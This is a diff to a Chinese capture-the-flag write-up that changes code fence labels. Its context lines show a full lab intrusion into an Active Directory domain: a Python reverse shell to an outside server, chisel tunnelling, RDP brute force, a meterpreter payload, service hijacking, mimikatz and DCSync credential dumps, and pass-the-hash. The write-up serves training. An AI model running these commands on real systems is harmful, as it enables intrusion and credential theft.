@@ -24,7 +24,7 @@ Tags
 
 使用 `fscan` 对入口点靶机进行扫描
 
-```shell
+```bash
 start infoscan
 39.99.241.120:80 open
 39.99.241.120:21 open
@@ -71,7 +71,7 @@ sid=#data_d_.._d_.._d_.._d_1.php&slen=693&scontent=<?php phpinfo();?>
 
 基于 webshell，反弹 shell 到 vps
 
-```shell
+```bash
 root@jmt-projekt:~# nc -lvnp 9999
 Listening on 0.0.0.0 9999
 Connection received on 39.99.237.127 43980
@@ -83,11 +83,11 @@ Python 3.8.10
 
 鉴于存在有 Python 环境，使用 python 的反弹 shell 进一步获取完成 shell 功能
 
-```shell title="netcat listener"
+```bash title="netcat listener"
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("139.*.*.*",8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'
 ```
 
-```shell title="pwncat-cs listener"
+```bash title="pwncat-cs listener"
 root@jmt-projekt:~# pwncat-cs -lp 8888
 [08:25:49] Welcome to pwncat 🐈!                                                                                                                                                                 __main__.py:164
 [08:26:19] received connection from 39.99.237.127:39390                                                                                                                                               bind.py:84
@@ -102,7 +102,7 @@ www-data
 
 对 suid 特权文件进行扫描
 
-```shell
+```bash
 (remote) www-data@localhost:/$ find / -perm -u=s -type f 2>/dev/null
 /usr/bin/stapbpf
 /usr/bin/gpasswd
@@ -127,7 +127,7 @@ www-data
 
 同时发现 flag 文件
 
-```shell
+```bash
 (remote) www-data@localhost:/$ ls -lh /home/flag/
 total 4.0K
 -r-------- 1 root root 798 Jul 24 08:14 flag01.txt
@@ -159,14 +159,14 @@ I'll do whatever I can to rock you...
 
 借助 `pwncat-cs` 的文件上传能力，上传 `chisel_1.9.1_linux_amd64` 之后，建立代理隧道
 
-```shell title="vps 139.*.*.*"
+```bash title="vps 139.*.*.*"
 root@jmt-projekt:~# ./chisel_1.9.1_linux_amd64 server -p 1337 --reverse
 2024/07/24 08:45:56 server: Reverse tunnelling enabled
 2024/07/24 08:45:56 server: Fingerprint 2YUi1QXviZmFSEGJIEb3uN4KxK+uVWmTtTH0LIaylDo=
 2024/07/24 08:45:56 server: Listening on http://0.0.0.0:1337
 ```
 
-```shell title="入口点 39.99.241.120"
+```bash title="入口点 39.99.241.120"
 (remote) www-data@localhost:/tmp$ ./chisel_1.9.1_linux_amd64 client 139.*.*.*:1337 R:0.0.0.0:10001:socks &
 [1] 3352
 2024/07/24 08:46:44 client: Connecting to ws://139.*.*.*:1337
@@ -175,7 +175,7 @@ root@jmt-projekt:~# ./chisel_1.9.1_linux_amd64 server -p 1337 --reverse
 
 成功建立连接
 
-```shell title="vps 139.*.*.*"
+```bash title="vps 139.*.*.*"
 2024/07/24 08:46:44 server: session#1: tun: proxy#R:10001=>socks: Listening
 ```
 
@@ -183,7 +183,7 @@ root@jmt-projekt:~# ./chisel_1.9.1_linux_amd64 server -p 1337 --reverse
 
 上传 `fscan` 进行内网扫描
 
-```shell
+```bash
 (remote) www-data@localhost:/tmp$ ifconfig
 eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
         inet 172.22.4.36  netmask 255.255.0.0  broadcast 172.22.255.255
@@ -262,7 +262,7 @@ I'll do whatever I can to rock you...
 
 尝试进行 RDP 爆破
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ proxychains4 -q hydra -l "Adrian" -P /usr/share/wordlists/rockyou.txt rdp://172.22.4.45 -vV
 [ATTEMPT] target 172.22.4.45 - login "Adrian" - pass "babygirl1" - 219 of 14344399 [child 3] (0/0)
@@ -279,7 +279,7 @@ I'll do whatever I can to rock you...
 
 尝试使用 `rdesktop` 进行连接
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ proxychains4 rdesktop 172.22.4.45
 [proxychains] config file found: /etc/proxychains4.conf
@@ -354,7 +354,7 @@ UserCanStop       : True
 
 建立内网 -> 外网的端口转发
 
-```shell title="入口点 172.22.4.36"
+```bash title="入口点 172.22.4.36"
 (remote) www-data@localhost:/tmp$ ifconfig
 eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
         inet 172.22.4.36  netmask 255.255.0.0  broadcast 172.22.255.255
@@ -383,7 +383,7 @@ lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
 
 使用 `msfvenom` 生成载荷
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~]
 └─$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.22.4.36 LPORT=7777 -f exe -o exploit-172.22.4.36-7777.exe
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
@@ -396,7 +396,7 @@ Saved as: exploit-172.22.4.36-7777.exe
 
 开启监听
 
-```shell
+```bash
 root@jmt-projekt:~# msfconsole -q
 This copy of metasploit-framework is more than two weeks old.
  Consider running 'msfupdate' to update to the latest version.
@@ -415,7 +415,7 @@ msf6 exploit(multi/handler) > exploit
 
 将载荷投放到靶机之后，修改服务
 
-```shell
+```bash
 PS C:\Users\Adrian> reg query HKLM\SYSTEM\CurrentControlSet\Services\gupdate
 
 HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\gupdate
@@ -439,13 +439,13 @@ PS C:\Users\Adrian> reg add HKLM\SYSTEM\CurrentControlSet\Services\gupdate /v Im
 
 然后在 `cmd` 中启动服务
 
-```shell
+```bash
 sc start gupdate
 ```
 
 即可收到回连的 Meterpreter 会话
 
-```shell
+```bash
 msf6 exploit(multi/handler) > exploit
 
 [*] Started reverse TCP handler on 0.0.0.0:7777
@@ -458,7 +458,7 @@ meterpreter >
 
 这里的 `Reason: Died` 是由于会话因服务停止而自动杀死，为了避免这种情况，可以在 Meterpreter 会话建立之时及时进行进程迁移
 
-```shell
+```bash
 msf6 exploit(multi/handler) > exploit
 
 [*] Started reverse TCP handler on 0.0.0.0:7777
@@ -521,7 +521,7 @@ flag02: flag{8012e1e3-a8e1-4d81-81a1-08cb05b91dd6}
 
 加载 `mimikatz` 模块
 
-```shell
+```bash
 meterpreter > load kiwi
 Loading extension kiwi...
   .#####.   mimikatz 2.2.0 20191125 (x64/windows)
@@ -536,7 +536,7 @@ Success.
 
 获取所有凭据
 
-```shell
+```bash
 meterpreter > creds_all
 [+] Running as SYSTEM
 [*] Retrieving all credentials
@@ -581,7 +581,7 @@ win19$    XIAORANG.LAB  62 99 91 1f f6 48 22 37 9c 72 d0 6b e6 f2 49 4f 35 c3 30
 
 同时获取用户的哈希信息
 
-```shell
+```bash
 meterpreter > hashdump
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:ba21c629d9fd56aff10c3e826323e6ab:::
 Adrian:1003:aad3b435b51404eeaad3b435b51404ee:3008c87294511142799dca1191e69a0f:::
@@ -592,7 +592,7 @@ WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:44d8d68ed7968b02da0ebdda
 
 使用 [lzzbb/Adinfo: 域信息收集工具](https://github.com/lzzbb/Adinfo) 进一步抓取域内信息
 
-```shell
+```bash
 PS C:\Users\Adrian\Desktop> .\Adinfo_win.exe -d xiaorang.lab --dc 172.22.4.7 -u WIN19$ -H 22efd36d08f27afdf0628d9ba2bff827
 
            _____  _        __
@@ -672,14 +672,14 @@ PS C:\Users\Adrian\Desktop> .\Adinfo_win.exe -d xiaorang.lab --dc 172.22.4.7 -u 
 
 首先，创建新的管理员账号
 
-```shell
+```bash
 net user randark admin123 /add
 net localgroup administrators randark /add
 ```
 
 登陆新的管理员账号，上传 `Rubeus.exe` 进行票据抓取
 
-```shell
+```bash
 PS C:\Users\randark\Desktop> .\Rubeus.exe monitor /interval:1 /nowrap /targetuser:DC01$
 
    ______        _
@@ -698,7 +698,7 @@ PS C:\Users\randark\Desktop> .\Rubeus.exe monitor /interval:1 /nowrap /targetuse
 
 用 `dfscoerce` 触发 RPC 使 DC 向 WIN19 认证
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~/pocs]
 └─$ proxychains4 python3 ./DFSCoerce/dfscoerce.py -u "WIN19$" -hashes :22efd36d08f27afdf0628d9ba2bff827 -d xiaorang.lab win19 172.22.4.7
 [proxychains] config file found: /etc/proxychains4.conf
@@ -719,7 +719,7 @@ DFSNM SessionError: code: 0x490 - ERROR_NOT_FOUND - Element not found.
 
 成功监听到票据
 
-```shell
+```bash
 [*] 2024/7/24 2:18:02 UTC - Found new TGT:
 
   User                  :  DC01$@XIAORANG.LAB
@@ -740,7 +740,7 @@ DFSNM SessionError: code: 0x490 - ERROR_NOT_FOUND - Element not found.
 
 然后使用 `Mimikatz` 进行 DCSync
 
-```shell
+```bash
 mimikatz(commandline) # kerberos::purge
 Ticket(s) purge for current session is OK
 
@@ -843,7 +843,7 @@ Supplemental Credentials:
 
 使用 `Rubeus` 导入票据
 
-```shell
+```bash
 PS C:\Users\randark\Desktop> .\Rubeus.exe ptt /ticket:doIFlDCCBZCgAwIBBaEDAgEWooIEnDCCBJhhggSUMIIEkKADAgEFoQ4bDFhJQU9SQU5HLkxBQqIhMB+gAwIBAqEYMBYbBmtyYnRndBsMWElBT1JBTkcuTEFCo4IEVDCCBFCgAwIBEqEDAgECooIEQgSCBD5aZsYI9Sw2W6J+rVNw+77PB+2CdipSyfMJuMYJuep25IVTVTASjwKCfMgBjw0UjoQHMrTZmXdiQD5RBKogFn3zkQgqUUSTHMkjtN5/97EcrNuobYOEYByCcJDJVNVFYpF4BHvOwT1oW9tfRNK8YGcKSwSTyIITkeLbukhwym5CbYgiy//zubFVQTkR31cokGPtkuPfBt5lI27xMKhxQ1Ij59EQHGoYOIJBrO2Lvc0UCD19aVHq2Qqf/dqaYwUZ2q/YhEnby/ws/dCfZlWpPJK/pgDErh9ibcsEABDvV8Rhm833Yc8jIPf8J8DKFKFAfl80ZnxRwTLTXIKR3fpj0kFWg3pSApolh4SY3PiW7k9X9fuK+4LI8TuH5ZK47MAafUMvByyGYZwJ3Yrar0m99ia9JLn3jrX6Qk4LpK3VJppuNlN+gwMC9/mYlGyjlXCBZgZCnalbgNUlRFdvqHZBettxrYugDGGYErhKWt/XtLPW4fvA2FkscK8wm0N1/o0GcdhD/Oy2f+Symu57vNZoQvUqoKVPlbt7ccF6V9BLQoGuIr831JrMDLXGdPChV+qBRe9ErHUKFTZb4o02Q22gxltkltpprYBNprl9mS9FWWycGDO7e6wYGrYTFxFaHwUL7U+TY3OiYucHTzUWh1cauxjYchJBZqI7oOe0MW9IdJ6OkFSK1IpGlPr0WgEpG5RBN1pYvap4H/zHzpR4DvUvJezoJNEZJ8050+3PujeDGV9RRQTkMema+LGyefR3yKe88yiJ+xu+dZI4GWfj96vlQ0wphmm8/ysUMUG9OOfwS8rk98qP0SplwsuCdyvXQxGZOOA9/RPeMgV0KBJwcociO2FRykFL7GVexVJ62Wtl/UY9WqCpBTr44A9gvR92si7gNJdIdHf1AvTSD3xlHOWqYC6E/sFBU6BMjmoFDycK9wmcr1qpg/n3Zm+EnsMb5LLEL3VlK413NadraLP+/mA1CtrQQgSCoWP5uGTwzD/4e64IqgVbt0QrZdQspmd9UsiIX97vxVrTY2Ca4UObnl0LSJc2gUVnP3qSm5J4AXEQRNzI+0m40KshstoIz1dsJp/YVcze+DLeH6HbkFqlTM8hUVok5M69guHXNtsavg2xnw/rjcU2/SyH8vnd4cQgbKirAb0BYt/sIS4wtiOtrbq0vr06c1L10xwkjfe4IC8pmCG6q9RADOn8n+SfFpXBkoSMFUyfqwf4DuS83703iBPG13ushLxWpDcDCxISd2uk8BlatFwNXGDL0IOJnESLseMvwX3Csw8+9PRDLWTIHrAr5a/Np/tZAT3yvh85XE26m6hLs7cGAFXH+m8cmkSws2lTDvERTgXm3uxojoe8sJh7PPBWaM0surxjtYL1JL+6RD6oH/S/2qmw/bFSIanrVM5dwCKblSkcKUKqMg8re4iQ74MqUY6dff2RGt5zldrqk6SjgeMwgeCgAwIBAKKB2ASB1X2B0jCBz6CBzDCByTCBxqArMCmgAwIBEqEiBCAkzDKS0dyBbUs2LWRfrMMsic4a1ZchdPHkd73Kcqxn96EOGwxYSUFPUkFORy5MQUKiEjAQoAMCAQGhCTAHGwVEQzAxJKMHAwUAYKEAAKURGA8yMDI0MDcyNDAwMTUxN1qmERgPMjAyNDA3MjQxMDE1MTdapxEYDzIwMjQwNzMxMDAxNTE3WqgOGwxYSUFPUkFORy5MQUKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDFhJQU9SQU5HLkxBQg==
 
    ______        _
@@ -862,7 +862,7 @@ PS C:\Users\randark\Desktop> .\Rubeus.exe ptt /ticket:doIFlDCCBZCgAwIBBaEDAgEWoo
 
 然后使用 `Mimikatz` 直接 DCSync
 
-```shell
+```bash
 PS C:\Users\randark\Desktop> .\mimikatz_trunk\x64\mimikatz.exe "lsadump::dcsync /domain:xiaorang.lab /all /csv" exit
 
   .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
@@ -894,7 +894,7 @@ Bye!
 
 ## 172.22.4.7 DC 使用 Administrator 哈希登录 DC
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~/pocs]
 └─$ proxychains4 -q impacket-psexec xiaorang/Administrator@172.22.4.7 -hashes :4889f6553239ace1f7c47fa2c619c252 -codec gbk
 Impacket v0.12.0.dev1 - Copyright 2023 Fortra
@@ -950,7 +950,7 @@ flag04: flag{6f4333a1-eed5-4bb4-9b6f-abdf55d0f67e}
 
 既然已经有了域内 Administrator 的凭据，直接拿下剩下的靶机即可
 
-```shell
+```bash
 ┌──(randark ㉿ kali)-[~/pocs]
 └─$ proxychains4 -q impacket-psexec xiaorang/Administrator@172.22.4.19 -hashes :4889f6553239ace1f7c47fa2c619c252 -codec gbk
 Impacket v0.12.0.dev1 - Copyright 2023 Fortra
